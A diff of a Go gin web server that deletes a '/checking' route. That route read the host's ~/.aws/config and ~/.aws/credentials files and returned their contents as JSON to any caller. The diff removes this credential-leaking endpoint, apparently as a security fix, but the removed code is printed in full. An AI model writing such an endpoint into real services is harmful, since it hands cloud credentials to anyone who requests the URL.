@@ -4,7 +4,6 @@ import (
 	"context"
 	"database/sql"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
@@ -130,32 +129,6 @@ func main() {
 		}
 		ctx.String(http.StatusOK, "pong")
 	})
-	r.GET("/checking", func(ctx *gin.Context) {
-		home := os.Getenv("HOME")
-		content, err := ioutil.ReadFile(home + "/.aws/config")
-		if err != nil {
-			ctx.JSON(http.StatusInternalServerError, gin.H{
-				"err": err,
-			})
-		}
-		text := string(content)
-
-		content, err = ioutil.ReadFile(home + "/.aws/credentials")
-		if err != nil {
-			ctx.JSON(http.StatusInternalServerError, gin.H{
-				"err": err,
-			})
-		}
-		credtext := string(content)
-
-		ctx.JSON(http.StatusOK, gin.H{
-			"Config content": text,
-			"Cred content":   credtext,
-			"home":           home,
-		})
-
-	})
-
 	var v1Route string
 	if cfg.Env == config.Production || cfg.Env == config.Local {
 		v1Route = "v1"
